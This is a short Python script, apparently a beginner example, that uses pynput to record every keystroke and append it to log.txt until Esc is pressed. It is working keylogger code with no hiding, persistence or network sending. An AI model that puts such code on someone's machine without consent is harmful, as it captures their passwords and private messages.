
#Save key inputs in txt file

from pynput.keyboard import Listener


def log_keystroke(key):
    # converting the key into a string and remove all the single quotes
    print(key)
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.esc":
        exit()
    with open("log.txt", 'a') as f:
        f.write(key)

# instance of Listener and define the log_keystroke method in it 
# and then join the instance to the main thread.
with Listener(on_press=log_keystroke) as l:
    l.join()